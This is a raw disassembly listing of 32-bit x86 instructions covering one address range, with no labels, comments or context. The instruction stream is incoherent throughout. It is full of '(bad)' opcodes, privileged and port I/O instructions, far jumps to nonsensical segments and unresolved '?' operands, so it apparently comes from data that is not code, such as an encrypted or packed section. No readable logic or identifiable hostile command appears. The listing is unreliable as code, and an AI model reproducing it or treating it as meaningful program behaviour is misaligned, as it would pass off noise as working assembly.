  41b35e:	arpl   WORD PTR [edx-0x49],cx
  41b361:	pop    ecx
  41b362:	inc    edx
  41b363:	loop   0x41b33f
  41b365:	dec    esi
  41b366:	mov    ebx,0x862a67b0
  41b36b:	jge    0x41b396
  41b36d:	loope  0x41b351
  41b36f:	les    eax,FWORD PTR [ebx-0x3539277f]
  41b375:	fldenv [eax+0x22]
  41b378:	xchg   edx,eax
  41b379:	or     al,0xcf
  41b37b:	xchg   edx,eax
  41b37c:	pop    ecx
  41b37d:	mov    bh,0xa8
  41b37f:	sar    DWORD PTR es:[ebp-0x689b0138],0x96
  41b387:	sbb    esp,eax
  41b389:	fdiv   st(0),st
  41b38b:	(bad)  
  41b38c:	gs mov esi,0x9105cca1
  41b392:	xchg   DWORD PTR [edx],eax
  41b394:	addr16 ja 0x41b35b
  41b397:	push   ds
  41b398:	sub    dh,BYTE PTR [edx+0x4a]
  41b39b:	mov    dl,0xe2
  41b39d:	scas   eax,DWORD PTR es:[edi]
  41b39e:	rcl    BYTE PTR [ecx-0x321c2ea],cl
  41b3a4:	add    edx,DWORD PTR [ebx+0x57]
  41b3a7:	push   edx
  41b3a8:	lods   eax,DWORD PTR ds:[esi]
  41b3a9:	(bad)  
  41b3aa:	jmp    0x40c6:0xcd71f664
  41b3b1:	je     0x41b38d
  41b3b3:	sar    BYTE PTR [ecx-0x56],1
  41b3b6:	fcomp  DWORD PTR [ecx]
  41b3b8:	pop    ds
  41b3b9:	inc    DWORD PTR [esi+0x47]
  41b3bc:	xchg   edi,eax
  41b3bd:	pop    ebp
  41b3be:	sub    DWORD PTR [esi],0x76
  41b3c1:	adc    BYTE PTR [esi+eax*2],cl
  41b3c4:	or     eax,0x40c2822e
  41b3c9:	mov    al,ds:0xfb8ae6a8
  41b3ce:	push   ebx
  41b3cf:	adc    esi,DWORD PTR [edi+0x4543c1b]
  41b3d5:	mov    ds:0x7fc1b25f,al
  41b3da:	test   DWORD PTR [esp+ecx*2+0x20632f74],edx
  41b3e1:	lock jp 0x41b3e4
  41b3e4:	loope  0x41b412
  41b3e6:	and    DWORD PTR [esi-0x78008997],0xffffffb5
  41b3ed:	or     eax,0xef652b35
  41b3f2:	cmp    ch,al
  41b3f4:	jmp    0xf4b:0x90d109e5
  41b3fb:	cli    
  41b3fc:	mov    bh,0x25
  41b3fe:	out    0x74,eax
  41b400:	push   ebx
  41b401:	pop    eax
  41b402:	push   0x2e5ae808
  41b407:	mov    dh,0x61
  41b409:	lods   eax,DWORD PTR ds:[esi]
  41b40a:	xor    al,0x28
  41b40c:	(bad)  
  41b40d:	stos   DWORD PTR es:[edi],eax
  41b40e:	adc    al,0x9
  41b410:	mov    ebx,0x8adb4111
  41b415:	repz fcmovnbe st,st(6)
  41b418:	test   eax,0x34e0a1ec
  41b41d:	pop    ebx
  41b41e:	dec    edx
  41b41f:	add    esp,0xe74e8b64
  41b425:	mov    BYTE PTR [ebp+0x5f],dh
  41b428:	outs   dx,BYTE PTR ds:[esi]
  41b429:	fmul   st,st(3)
  41b42b:	loop   0x41b42e
  41b42d:	inc    ecx
  41b42e:	std    
  41b42f:	addps  xmm4,XMMWORD PTR [edi-0x9]
  41b433:	scas   al,BYTE PTR es:[edi]
  41b434:	jnp    0x41b450
  41b436:	inc    BYTE PTR [edi+ebp*1+0x74]
  41b43a:	dec    esp
  41b43b:	(bad)  
  41b43c:	or     al,0x7c
  41b43e:	sub    dl,dl
  41b440:	pop    es
  41b441:	xor    eax,0xed14d75e
  41b446:	mov    bl,0x51
  41b448:	jp     0x41b4bc
  41b44a:	sub    al,0xfc
  41b44c:	dec    ebp
  41b44d:	jmp    0x4102:0xb5353935
  41b454:	adc    BYTE PTR [ecx],ch
  41b456:	daa    
  41b457:	lock xchg ecx,eax
  41b459:	inc    ecx
  41b45a:	inc    ebp
  41b45b:	mov    eax,ds:0x28025f5
  41b460:	inc    ebp
  41b461:	ret    
  41b462:	mov    ecx,0xe9be92a3
  41b467:	xlat   BYTE PTR ds:[ebx]
  41b468:	sub    ecx,DWORD PTR [edx]
  41b46a:	lds    eax,FWORD PTR cs:[eax-0x7167aac8]
  41b471:	jns    0x41b417
  41b473:	retf   0x6fa6
  41b476:	sub    DWORD PTR [edx-0x2e],esi
  41b479:	push   es
  41b47a:	inc    esi
  41b47b:	sar    BYTE PTR [eax+eax*4+0x130a9db5],0x53
  41b483:	pop    eax
  41b484:	int    0xe2
  41b486:	faddp  st(2),st
  41b488:	push   0x3
  41b48a:	add    BYTE PTR [esi],0x71
  41b48d:	jl     0x41b495
  41b48f:	fld    DWORD PTR [edi]
  41b491:	scas   al,BYTE PTR es:[edi]
  41b492:	mov    ?,esp
  41b494:	das    
  41b495:	bswap  esi
  41b497:	dec    ecx
  41b498:	or     al,0x91
  41b49a:	inc    ebp
  41b49b:	add    esi,edx
  41b49d:	test   BYTE PTR [edi],dh
  41b49f:	loop   0x41b505
  41b4a1:	cld    
  41b4a2:	in     eax,0x16
  41b4a4:	(bad)  
  41b4a5:	sahf   
  41b4a6:	mov    bl,0x80
  41b4a8:	xor    eax,0x28502aa8
  41b4ad:	arpl   WORD PTR [eax+ebx*4],bp
  41b4b0:	pop    eax
  41b4b1:	inc    esi
  41b4b2:	aas    
  41b4b3:	mov    eax,0x6e0cf243
  41b4b8:	shr    DWORD PTR [eax+0x7],cl
  41b4bb:	(bad)  
  41b4bc:	jg     0x41b46c
  41b4be:	ins    BYTE PTR es:[edi],dx
  41b4bf:	adc    al,0xa0
  41b4c1:	icebp  
  41b4c2:	adc    al,0x62
  41b4c4:	and    cl,BYTE PTR [edx+ebx*1+0x4]
  41b4c8:	scas   al,BYTE PTR es:[edi]
  41b4c9:	inc    eax
  41b4ca:	adc    BYTE PTR [ecx+0x5e2a5f96],al
  41b4d0:	ffreep st(0)
  41b4d2:	sbb    ebx,DWORD PTR fs:[edx+0x9]
  41b4d6:	push   es
  41b4d7:	mov    ecx,0xe4370f8
  41b4dc:	cmp    eax,0x38c3d56f
  41b4e1:	bound  edi,QWORD PTR [eax-0x8]
  41b4e4:	jp     0x41b509
  41b4e6:	dec    esp
  41b4e7:	jb     0x41b499
  41b4e9:	in     al,dx
  41b4ea:	and    bl,BYTE PTR [ecx+0x149facd3]
  41b4f0:	or     DWORD PTR [ebp+0x730618d2],edx
  41b4f6:	fcmovb st,st(6)
  41b4f8:	jge    0x41b4ac
  41b4fa:	adc    cl,BYTE PTR [ecx+0x2e368fd5]
  41b500:	xchg   esp,eax
  41b501:	data16 jne 0x41b538
  41b504:	cwde   
  41b505:	sub    al,0x7e
  41b507:	cmc    
  41b508:	push   esp
  41b509:	test   BYTE PTR [ecx+0x59],bl
  41b50c:	fcomp  QWORD PTR [eax]
  41b50e:	mov    al,ds:0x6e3a8f18
  41b513:	ss hlt 
  41b515:	add    edi,DWORD PTR [edi+0x25]
  41b518:	adc    eax,ecx
  41b51a:	push   esi
  41b51b:	xchg   ebx,eax
  41b51c:	not    DWORD PTR [edx+0x7e]
  41b51f:	jle    0x41b57f
  41b521:	sbb    al,0x55
  41b523:	xchg   edx,eax
  41b524:	out    dx,al
  41b525:	jne    0x41b507
  41b527:	mov    ch,0xb8
  41b529:	jge    0x41b4e6
  41b52b:	sbb    DWORD PTR [eax-0x748b565e],ebx
  41b531:	retf   
  41b532:	adc    al,0x99
  41b534:	ror    DWORD PTR [edx-0x4a01ce66],1
  41b53a:	xor    eax,0x74e0b04c
  41b53f:	pushf  
  41b540:	push   ebp
  41b541:	pop    edx
  41b542:	aas    
  41b543:	mov    esi,0x466d78f1
  41b548:	ins    BYTE PTR es:[edi],dx
  41b549:	jns    0x41b518
  41b54b:	xchg   ebx,eax
  41b54c:	fist   DWORD PTR [esi+0x5a]
  41b54f:	inc    ecx
  41b550:	sbb    al,0xaa
  41b552:	sub    al,0x6
  41b554:	add    eax,DWORD PTR ds:0x7d3e4e4f
  41b55a:	fild   DWORD PTR [edx+ebp*2]
  41b55d:	xchg   DWORD PTR ds:0x1f613386,ebp
  41b563:	fistp  WORD PTR [edi]
  41b565:	int3   
  41b566:	pop    esp
  41b567:	fisub  WORD PTR [ebx-0x7e69bb59]
  41b56d:	dec    ebx
  41b56e:	xor    DWORD PTR [esi+eax*4+0x66],0x18156ad3
  41b576:	jl     0x41b589
  41b578:	xchg   edx,eax
  41b579:	call   0x775b:0xa50ff964
  41b580:	cwde   
  41b581:	into   
  41b582:	out    0xba,al
  41b584:	sbb    BYTE PTR [edi-0x155a17d0],0xa2
  41b58b:	aad    0x9
  41b58d:	jne    0x41b579
  41b58f:	shl    DWORD PTR [ebp-0x58031710],1
  41b595:	mov    BYTE PTR [eax+0x3b52e7d7],dh
  41b59b:	mov    DWORD PTR ds:0x5d9a2205,ebx
  41b5a1:	cmc    
  41b5a2:	std    
  41b5a3:	pop    ecx
  41b5a4:	mov    esp,0x643a8773
  41b5a9:	xchg   edx,eax
  41b5aa:	jmp    0x41b575
  41b5ac:	adc    al,0x15
  41b5ae:	addr16 (bad) 
  41b5b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b5b1:	xchg   BYTE PTR [edx+edi*1],al
  41b5b4:	mov    ds:0x5f4c793f,eax
  41b5b9:	cwde   
  41b5ba:	jge    0x41b572
  41b5bc:	mov    eax,ds:0x7b86198b
  41b5c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b5c2:	jmp    0xbc22587f
  41b5c7:	sbb    cl,BYTE PTR [ebp-0x1f]
  41b5ca:	dec    ebx
  41b5cb:	mov    ebp,0x89450a90
  41b5d0:	jns    0x41b592
  41b5d2:	es add eax,ecx
  41b5d5:	sub    al,0xac
  41b5d7:	push   esp
  41b5d8:	xchg   ebp,eax
  41b5d9:	test   eax,0x555feeac
  41b5de:	cmc    
  41b5df:	leave  
  41b5e0:	cmp    ah,BYTE PTR [edx]
  41b5e2:	or     eax,0x9262180
  41b5e7:	mov    cl,0x23
  41b5e9:	pop    ebp
  41b5ea:	pop    ecx
  41b5eb:	adc    dh,BYTE PTR [ebx]
  41b5ed:	ss (bad) 
  41b5ef:	ins    DWORD PTR es:[edi],dx
  41b5f0:	mov    eax,0x89e75511
  41b5f5:	test   al,0xbf
  41b5f7:	cmp    al,0x2b
  41b5f9:	aam    0x89
  41b5fb:	mov    edi,0x3f3091f5
  41b600:	scas   al,BYTE PTR es:[edi]
  41b601:	int3   
  41b602:	sar    DWORD PTR [edi],cl
  41b604:	clc    
  41b605:	jecxz  0x41b613
  41b607:	pop    ds
  41b608:	bnd jmp 0x537bb69a
  41b60e:	inc    ebx
  41b60f:	iret   
  41b610:	pop    ds
  41b611:	jne    0x41b5b7
  41b613:	sbb    al,0xd0
  41b615:	mov    edi,0x8481d015
  41b61a:	add    cl,bl
  41b61c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b61d:	xor    bh,dl
  41b61f:	std    
  41b620:	sti    
  41b621:	push   0x792fc46e
  41b626:	ins    BYTE PTR es:[edi],dx
  41b627:	jecxz  0x41b5ee
  41b629:	jge    0x41b5f3
  41b62b:	mov    edx,0xc3e1fdfa
  41b630:	adc    al,0x24
  41b633:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b634:	or     al,0xd
  41b636:	adc    ebp,DWORD PTR [edi-0x1d]
  41b639:	bswap  esp
  41b63b:	xor    eax,0xf0dcd6d2
  41b640:	pop    esi
  41b641:	dec    eax
  41b642:	js     0x41b66e
  41b644:	inc    ebx
  41b645:	mov    ecx,0xf7e31fbf
  41b64a:	mov    WORD PTR [edi+0x44e33493],?
  41b650:	call   0x833acac9
  41b655:	push   eax
  41b656:	lods   al,BYTE PTR ds:[esi]
  41b657:	jmp    0x41b635
  41b659:	adc    al,0xfc
  41b65b:	cdq    
  41b65c:	int3   
  41b65d:	jns    0x41b643
  41b65f:	cmp    DWORD PTR ds:[ecx-0x1964abd9],esp
  41b666:	pop    ebp
  41b667:	dec    eax
  41b668:	mov    ecx,0x928379cb
  41b66d:	test   al,0xd5
  41b66f:	pop    ecx
  41b670:	in     al,dx
  41b671:	push   edi
  41b672:	dec    esi
  41b673:	and    BYTE PTR [edx-0x29a1cb80],0x41
  41b67a:	mov    ds,ebp
  41b67c:	mov    ebp,0x88779268
  41b681:	retf   0x93c0
  41b684:	inc    ebp
  41b685:	cmp    bh,BYTE PTR [edi-0x36a4885]
  41b68b:	int    0x15
  41b68d:	call   0xd8013bc7
  41b692:	sub    BYTE PTR [eax],bh
  41b694:	mov    DWORD PTR [ebx],esi
  41b696:	jecxz  0x41b651
  41b698:	in     eax,0x58
  41b69a:	push   0x4
  41b69c:	and    al,0xd7
  41b69e:	add    BYTE PTR [edx+0x77],ah
  41b6a1:	cli    
  41b6a2:	jmp    0xf5f9:0xb8655202
  41b6a9:	dec    eax
  41b6aa:	int3   
  41b6ab:	mov    al,0xda
  41b6ad:	arpl   WORD PTR [ebp-0x50],bx
  41b6b0:	inc    edx
  41b6b1:	aad    0xb3
  41b6b3:	push   eax
  41b6b4:	xchg   ecx,eax
  41b6b5:	cli    
  41b6b6:	mov    esi,esi
  41b6b8:	lods   eax,DWORD PTR ds:[esi]
  41b6b9:	clc    
  41b6ba:	jmp    0xeff8cc25
  41b6bf:	mov    ch,0xdc
  41b6c1:	stos   DWORD PTR es:[edi],eax
  41b6c2:	inc    eax
  41b6c3:	sbb    edx,ebx
  41b6c5:	hlt    
  41b6c6:	stc    
  41b6c7:	lods   eax,DWORD PTR ds:[esi]
  41b6c8:	sbb    BYTE PTR [ebp+edi*4+0x57],bh
  41b6cc:	outs   dx,BYTE PTR ds:[esi]
  41b6cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b6ce:	mov    ecx,edx
  41b6d0:	(bad)  
  41b6d1:	in     al,0xc9
  41b6d3:	mov    BYTE PTR [edi+eax*2],al
  41b6d6:	gs call 0x8734:0x56de91db
  41b6de:	inc    ebx
  41b6df:	mov    eax,ds:0x2ca6f726
  41b6e4:	inc    edi
  41b6e5:	repz dec ecx
  41b6e7:	and    al,0x38
  41b6e9:	jns    0x41b715
  41b6eb:	xchg   ebx,eax
  41b6ec:	add    cl,BYTE PTR [edi-0x5f0eed13]
  41b6f2:	adc    al,0x28
  41b6f4:	mov    edx,0x1773f601
  41b6f9:	dec    edx
  41b6fa:	hlt    
  41b6fb:	dec    eax
  41b6fc:	int    0x9d
  41b6fe:	inc    esi
  41b6ff:	fimul  WORD PTR [esi+edi*8+0x18f5ece0]
  41b706:	fnstsw WORD PTR [esi+0x1]
  41b709:	xor    eax,0xc8b31eb7
  41b70e:	mov    eax,0xe7cd230e
  41b713:	jmp    DWORD PTR [edi+0x2b8ac54a]
  41b719:	mov    ds:0x9f4f4e7,al
  41b71e:	mov    esp,0xddd25c49
  41b723:	shr    DWORD PTR [eax+0x33a4038e],0x3e
  41b72a:	sub    BYTE PTR [eax+0x2c],0x53
  41b72e:	into   
  41b72f:	out    0x32,al
  41b731:	jg     0x41b6f7
  41b733:	ss scas al,BYTE PTR es:[edi]
  41b735:	lds    ebx,FWORD PTR [esi+0x184d5b0a]
  41b73b:	dec    ebx
  41b73c:	xchg   DWORD PTR [edi-0x1d83027c],ebx
  41b742:	mov    ecx,0x9d5cde37
  41b747:	mov    edx,ecx
  41b749:	into   
  41b74a:	loope  0x41b781
  41b74c:	jecxz  0x41b74e
  41b74e:	jp     0x41b78e
  41b750:	ror    BYTE PTR [edx-0x33d86e5c],0x62
  41b757:	push   esp
  41b758:	dec    ebx
  41b759:	dec    ecx
  41b75a:	data16 or BYTE PTR [edx-0x4710c8f4],bl
  41b761:	push   esp
  41b762:	mov    bh,0xaf
  41b764:	call   0x1a397fdc
  41b769:	inc    edi
  41b76a:	mov    bl,0x1f
  41b76c:	adc    al,0xd7
  41b76e:	imul   ebx,DWORD PTR [eax+ebx*2],0x2915b104
  41b775:	test   al,0x50
  41b777:	ror    DWORD PTR [eax+edx*1+0x1e],0xdb
  41b77c:	and    dh,ah
  41b77e:	(bad)  
  41b77f:	retf   0x2ed8
  41b782:	dec    edi
  41b783:	jg     0x41b7c8
  41b785:	add    DWORD PTR [ecx+0x142e88b0],ecx
  41b78b:	pop    edx
  41b78c:	sub    BYTE PTR [ebp-0xf],al
  41b78f:	loop   0x41b7d7
  41b791:	ins    DWORD PTR es:[edi],dx
  41b792:	xchg   edx,eax
  41b793:	stos   BYTE PTR es:[edi],al
  41b794:	dec    edx
  41b795:	into   
  41b796:	add    BYTE PTR [esp+esi*4],bh
  41b799:	lahf   
  41b79a:	test   ch,bl
  41b79c:	inc    ebx
  41b79d:	and    eax,0x8efb0242
  41b7a2:	in     al,dx
  41b7a3:	jle    0x41b794
  41b7a5:	mov    ecx,0x804ec899
  41b7aa:	sub    DWORD PTR [eax-0x557a08b4],0x3b
  41b7b1:	xor    BYTE PTR [esi+0x63164d74],dh
  41b7b7:	std    
  41b7b8:	repz or cl,bl
  41b7bb:	cmp    edi,DWORD PTR [edx+0x5f]
  41b7be:	imul   eax,DWORD PTR [ebx],0x9b47212a
  41b7c4:	mov    edi,0x22914760
  41b7c9:	inc    ecx
  41b7ca:	cdq    
  41b7cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b7cc:	pop    edi
  41b7cd:	dec    eax
  41b7ce:	fcomp  QWORD PTR [ebx-0x67f03527]
  41b7d4:	mov    ecx,DWORD PTR [eax+0x6fe6f1b]
  41b7da:	inc    ebp
  41b7db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b7dc:	leave  
  41b7dd:	aam    0xa7
  41b7df:	jp     0x41b7a0
  41b7e1:	dec    edi
  41b7e2:	ret    0x8023
  41b7e5:	cmp    cl,BYTE PTR [eax+ebp*1+0x4774f87e]
  41b7ec:	outs   dx,BYTE PTR ds:[esi]
  41b7ed:	xchg   ecx,eax
  41b7ee:	cli    
  41b7ef:	xchg   edi,eax
  41b7f0:	push   edi
  41b7f1:	xchg   edx,eax
  41b7f2:	in     eax,0x2b
  41b7f4:	or     ch,dl
  41b7f6:	mov    al,0x4f
  41b7f8:	dec    ebp
  41b7f9:	aas    
  41b7fa:	iret   
  41b7fb:	int3   
  41b7fc:	mov    al,0x62
  41b7fe:	xor    ebx,DWORD PTR [edi-0x58]
  41b801:	push   eax
  41b802:	and    ecx,DWORD PTR [ecx]
  41b804:	cld    
  41b805:	js     0x41b78c
  41b807:	and    eax,0x5f967267
  41b80c:	sbb    BYTE PTR [edi+0x24],ch
  41b80f:	stos   BYTE PTR es:[edi],al
  41b810:	xchg   ebx,edi
  41b812:	retf   
  41b813:	ret    0x405f
  41b816:	cmp    eax,0x93488137
  41b81b:	mov    ch,0x8d
  41b81d:	mov    edx,0xacf6a52d
  41b822:	push   ecx
  41b823:	fs ja  0x41b825
  41b826:	push   ss
  41b827:	out    0xb5,al
  41b829:	xchg   DWORD PTR [ecx],ecx
  41b82b:	repnz icebp 
  41b82d:	clc    
  41b82e:	fwait
  41b82f:	or     eax,0xc248e844
  41b834:	push   esp
  41b835:	xor    eax,0xa353b05d
  41b83a:	iret   
  41b83b:	dec    ecx
  41b83c:	sbb    al,0x67
  41b83e:	xchg   ebp,eax
  41b83f:	and    ecx,esp
  41b841:	dec    ebx
  41b842:	out    0x36,al
  41b844:	addr16 jnp 0x41b872
  41b847:	enter  0x20f1,0xef
  41b84b:	mov    ds:0x746a5066,al
  41b850:	je     0x41b80c
  41b852:	sub    al,BYTE PTR [ecx]
  41b854:	pop    edx
  41b855:	sbb    DWORD PTR [esi+0x7a],0xffffff81
  41b859:	nop
  41b85a:	pop    ecx
  41b85b:	test   BYTE PTR [ebp+0x36],ah
  41b85e:	neg    BYTE PTR [ebp+0x56]
  41b861:	pop    esi
  41b862:	test   DWORD PTR [edx+eiz*4],ecx
  41b865:	jecxz  0x41b8ad
  41b867:	cmp    al,0x13
  41b869:	sahf   
  41b86a:	scas   eax,DWORD PTR es:[edi]
  41b86b:	ins    DWORD PTR es:[edi],dx
  41b86c:	inc    ebp
  41b86d:	pop    es
  41b86e:	inc    esi
  41b86f:	sbb    dl,BYTE PTR [eax+0x5e]
  41b872:	mov    dh,0x59
  41b874:	xchg   ebx,eax
  41b875:	test   eax,0x71483e33
  41b87a:	je     0x41b8b7
  41b87c:	xor    eax,edi
  41b87e:	sbb    DWORD PTR ds:0x95ec3bf3,edi
  41b884:	adc    DWORD PTR [edx+0x56],edx
  41b887:	mov    cs,esi
  41b889:	sbb    ecx,DWORD PTR [eax+eiz*1]
  41b88c:	adc    edx,esi
  41b88e:	mov    ds:0x63970fb9,al
  41b893:	mov    ebx,0x429ab1de
  41b898:	rol    ah,0x59
  41b89b:	push   ebp
  41b89c:	loope  0x41b8e9
  41b89e:	ret    0xb32a
  41b8a1:	jnp    0x41b8fe
  41b8a3:	imul   edi,DWORD PTR [esi-0x36ab8fd5],0xd6f0afa8
  41b8ad:	cmp    DWORD PTR [ebx-0x291fd3c8],ebp
  41b8b3:	xchg   esp,eax
  41b8b4:	call   0x20eb:0x1a34c463
  41b8bb:	inc    ecx
  41b8bc:	les    esi,FWORD PTR [esi+0x5a]
  41b8bf:	inc    ebx
  41b8c0:	jge    0x41b910
  41b8c2:	sbb    BYTE PTR [ebp*8-0x72f074ec],al
  41b8c9:	sbb    BYTE PTR ds:0x9a3daaf0,bh
  41b8cf:	aam    0xf7
  41b8d1:	daa    
  41b8d2:	lods   eax,DWORD PTR ds:[esi]
  41b8d3:	clc    
  41b8d4:	pop    edi
  41b8d5:	rcl    BYTE PTR [ebx+eiz*2],1
  41b8d8:	neg    DWORD PTR [esi]
  41b8da:	jae    0x41b8a6
  41b8dc:	repz xor edx,DWORD PTR [ebx+0x4fb054c9]
  41b8e3:	xor    eax,0x290bc48d
  41b8e8:	or     al,0x7a
  41b8ea:	add    eax,0x11909b8b
  41b8ef:	pop    ss
  41b8f0:	pop    ecx
  41b8f1:	pop    esp
  41b8f2:	scas   al,BYTE PTR es:[edi]
  41b8f3:	or     al,BYTE PTR [edx+ebx*1-0x6c]
  41b8f7:	xchg   al,dl
  41b8f9:	je     0x41b8f5
  41b8fb:	leave  
  41b8fc:	(bad)  
  41b8fd:	test   BYTE PTR [esi+0x60],0xd3
  41b901:	add    eax,0xfb5836a6
  41b906:	jae    0x41b931
  41b908:	in     al,0x9d
  41b90a:	pop    ebp
  41b90b:	aam    0x9c
  41b90d:	(bad)  
  41b90e:	(bad)  
  41b90f:	jo     0x41b967
  41b911:	and    al,0x1f
  41b913:	add    DWORD PTR ss:[edi+0x74],edx
  41b917:	aad    0x1a
  41b919:	dec    esp
  41b91a:	in     eax,dx
  41b91b:	xor    edx,ecx
  41b91d:	fcomp  QWORD PTR [esi+0xa]
  41b920:	xchg   ecx,eax
  41b921:	out    dx,al
  41b922:	and    dh,bl
  41b924:	stos   BYTE PTR es:[edi],al
  41b925:	test   al,0xe8
  41b927:	xchg   ecx,eax
  41b928:	cld    
  41b929:	cwde   
  41b92a:	pop    es
  41b92b:	fdivr  QWORD PTR [eax+0x39f68510]
  41b931:	imul   edi,ebx,0x93fb8f17
  41b937:	fxch   st(5)
  41b939:	adc    eax,0xab5f5e18
  41b93e:	add    bh,BYTE PTR [esp+edi*2]
  41b941:	sbb    eax,0x411a8bac
  41b946:	mov    ds:0x140d1b40,al
  41b94b:	inc    esp
  41b94c:	mov    ebp,0x51bdd072
  41b951:	dec    eax
  41b952:	dec    edx
  41b953:	gs ret 0x4221
  41b957:	xchg   DWORD PTR ds:0xe1f0b9c2,esp
  41b95d:	xor    eax,0xacfc5fdb
  41b962:	fist   WORD PTR [ebp+0x77]
  41b965:	(bad)  
  41b966:	popf   
  41b967:	into   
  41b968:	in     eax,0x8
  41b96a:	sub    DWORD PTR [esi],0x3e633b9d
  41b970:	shr    BYTE PTR [edx+0x6e77d009],cl
  41b976:	retf   0xfe15
  41b979:	pop    ebp
  41b97a:	cmp    DWORD PTR [eax+0x79],edi
  41b97d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b97e:	jns    0x41b9de
  41b980:	rcr    BYTE PTR [ebx+0xe],1
  41b983:	mov    ch,0xce
  41b985:	stos   DWORD PTR es:[edi],eax
  41b986:	sub    ecx,DWORD PTR [ecx]
  41b988:	or     al,0xfd
  41b98a:	ror    DWORD PTR [ebp+0x1a],cl
  41b98d:	arpl   WORD PTR [ebx+eax*1],ax
  41b990:	cmc    
  41b991:	jne    0x41b9f1
  41b993:	retf   
  41b994:	(bad)  
  41b995:	and    edi,DWORD PTR [esi+0x26]
  41b998:	lods   eax,DWORD PTR ds:[esi]
  41b999:	cmp    BYTE PTR [ebx-0x539e17cb],0x8e
  41b9a0:	rcl    bh,1
  41b9a2:	retf   0x8d80
  41b9a5:	je     0x41ba24
  41b9a7:	mov    WORD PTR [ecx],ds
  41b9a9:	call   0x642a79aa
  41b9ae:	cmp    ah,cl
  41b9b0:	fs retf 0x8794
  41b9b4:	push   esi
  41b9b5:	xchg   ecx,eax
  41b9b6:	jmp    0x9df59893
  41b9bb:	jo     0x41b96b
  41b9bd:	mov    eax,ds:0x67ab8132
  41b9c2:	es push 0x75
  41b9c5:	jne    0x41ba27
  41b9c7:	cmc    
  41b9c8:	cli    
  41b9c9:	ror    ebx,0x29
  41b9cc:	outs   dx,DWORD PTR ds:[esi]
  41b9cd:	cmp    DWORD PTR [edi],0x31
  41b9d0:	cmp    eax,0x3a9bf2ec
  41b9d5:	loop   0x41ba27
  41b9d7:	sbb    eax,0x1380d5b5
  41b9dc:	lods   eax,DWORD PTR ds:[esi]
  41b9dd:	inc    edx
  41b9de:	or     BYTE PTR [ebx+0x4ecb58c0],bh
  41b9e4:	add    ch,BYTE PTR [edx]
  41b9e6:	pop    eax
  41b9e7:	jmp    0x4a58276f
  41b9ec:	pop    ss
  41b9ed:	mov    dh,0x3c
  41b9ef:	mov    esi,0x769445bc
  41b9f4:	lods   al,BYTE PTR ds:[esi]
  41b9f5:	scas   al,BYTE PTR es:[edi]
  41b9f6:	sub    bl,bl
  41b9f8:	icebp  
  41b9f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b9fa:	xchg   ebp,eax
  41b9fb:	call   0x2bc0:0x5058bb01
  41ba02:	arpl   WORD PTR [edi],bp
  41ba04:	int    0xba
  41ba06:	inc    BYTE PTR [edx-0x5e]
  41ba09:	mov    al,0x33
  41ba0b:	arpl   cx,si
  41ba0d:	jg     0x41b99d
  41ba0f:	cmp    BYTE PTR [eax+0x76],dh
  41ba12:	push   esi
  41ba13:	sar    ebp,0x47
  41ba16:	leave  
  41ba17:	fs mov edi,0x7a0587c8
  41ba1d:	push   cs
  41ba1e:	and    ecx,edx
  41ba20:	(bad)  
  41ba21:	sbb    BYTE PTR [ecx],dl
  41ba23:	les    ebp,FWORD PTR [ebp+0x1b256f91]
  41ba29:	fmul   st(2),st
  41ba2b:	mov    edx,0xdd406370
  41ba30:	sub    dh,dh
  41ba32:	hlt    
  41ba33:	daa    
  41ba34:	adc    al,0xcc
  41ba36:	jmp    0x3d387c82
  41ba3b:	xchg   ax,ax
  41ba3d:	lock push ss
  41ba3f:	dec    ebp
  41ba40:	sub    ebp,DWORD PTR [esi+0xc]
  41ba43:	jbe    0x41b9cd
  41ba45:	xchg   edx,eax
  41ba46:	ror    DWORD PTR [edx],cl
  41ba48:	add    edi,DWORD PTR [edx]
  41ba4a:	call   0xbb23a50b
  41ba4f:	ret    
  41ba50:	add    bl,bh
  41ba52:	imul   DWORD PTR [ecx]
  41ba54:	hlt    
  41ba55:	adc    al,BYTE PTR [eax-0x53d765f0]
  41ba5b:	xchg   edx,eax
  41ba5c:	aas    
  41ba5d:	stos   DWORD PTR es:[edi],eax
  41ba5e:	into   
  41ba5f:	icebp  
  41ba60:	in     al,0x50
  41ba62:	in     al,dx
  41ba63:	and    DWORD PTR [esi-0xb],0xffffffff
  41ba67:	cwde   
  41ba68:	call   0x87ab3024
  41ba6d:	mov    dl,0x60
  41ba6f:	arpl   cx,bp
  41ba71:	sub    al,0xac
  41ba73:	inc    DWORD PTR [edi-0x1e9604b9]
  41ba79:	cld    
  41ba7a:	inc    edi
  41ba7b:	push   ss
  41ba7c:	clc    
  41ba7d:	mov    al,ds:0x20f926b4
  41ba82:	mov    ds:0x3f0e8b3d,eax
  41ba87:	neg    BYTE PTR ds:0xd751722
  41ba8d:	(bad)  
  41ba8e:	push   eax
  41ba8f:	or     eax,0xbc24978
  41ba94:	jg     0x41ba40
  41ba96:	fcomp  DWORD PTR [ebx]
  41ba98:	or     dh,BYTE PTR [ebx-0x5c]
  41ba9b:	scas   eax,DWORD PTR es:[edi]
  41ba9c:	pop    esi
  41ba9d:	or     al,0xea
  41ba9f:	rol    BYTE PTR [ebx-0x11],1
  41baa2:	mov    dh,ch
  41baa4:	ja     0x41bace
  41baa6:	mov    esp,cs
  41baa8:	jbe    0x41bac5
  41baaa:	mov    ah,0xef
  41baac:	mov    dl,0xad
  41baae:	inc    eax
  41baaf:	xor    DWORD PTR [edi-0x28992ae6],ecx
  41bab5:	sbb    bl,BYTE PTR [esi+0x15bc3b0f]
  41babb:	enter  0xc0b2,0x14
  41babf:	and    dh,BYTE PTR [edx+0x59f3c4dd]
  41bac5:	ins    DWORD PTR es:[edi],dx
  41bac6:	clc    
  41bac7:	mov    eax,ds:0xc29a12d4
  41bacc:	pop    es
  41bacd:	fmul   QWORD PTR [edx-0x9]
  41bad0:	daa    
  41bad1:	mov    al,0x76
  41bad3:	push   esp
  41bad4:	in     eax,0x7
  41bad6:	mov    esp,0xee3b791e
  41badb:	dec    eax
  41badc:	cli    
  41badd:	xor    DWORD PTR [ecx+0x46],0x22
  41bae1:	pop    ds
